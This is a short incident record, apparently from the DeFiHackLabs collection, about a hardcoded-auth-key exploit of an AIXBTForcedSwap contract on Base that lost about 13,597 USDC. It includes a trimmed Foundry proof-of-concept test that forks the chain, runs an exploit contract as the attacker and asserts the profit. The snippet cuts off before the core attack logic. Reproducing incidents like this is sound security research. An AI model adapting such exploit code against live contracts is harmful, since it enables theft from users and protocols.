# [?] AIXBTForcedSwap - Hardcoded Auth Key

## Summary
Severity: Unknown
Chain: Base
Component: AIXBTForcedSwap
Published: 2025-01-26
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/AIXBTForcedSwap_exp.sol
Type: defi-exploit-poc

## Details
Lost: 13,597.36 USDC

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 25_559_856;
        vm.createSelectFork("base", forkBlock);
        fundingToken = BASE_USDC;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(VULNERABLE_CONTRACT, "Victim contract");
        vm.label(AIXBT, "AIXBT");
        vm.label(BASE_USDC, "USDC");
        vm.label(BASE_WETH, "WETH");
        vm.label(UNISWAP_V3_POSITION_MANAGER, "Uniswap V3 position manager");
        vm.label(UNISWAP_V3_SWAP_ROUTER, "Uniswap V3 swap router");
        vm.label(AIXBT_USDC_FLASH_POOL, "AIXBT/USDC flash pool");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        AIXBTForcedSwapExploit exploit = new AIXBTForcedSwapExploit(ATTACKER);

        uint256 attackerBefore = IERC20(BASE_USDC).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(BASE_USDC).balanceOf(ATTACKER) - attackerBefore;
        emit log_named_decimal_uint("Attacker USDC profit", profit, 6);
        assertGt(profit, 13_000e6, "USDC profit below reported impact");
    }
}

contract AIXBTForcedSwapExploit {
    IERC20 private constant aixbt = IERC20(AIXBT);
    IERC20 private constant usdc = IERC20(BASE_USDC);
    IERC20 private constant weth = IERC20(BASE_WETH);
    INonfungiblePositionManager private constant positionManager =
        INonfungiblePositionManager(UNISWAP_V3_POSITION_MANAGER);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/AIXBTForcedSwap_exp.sol_
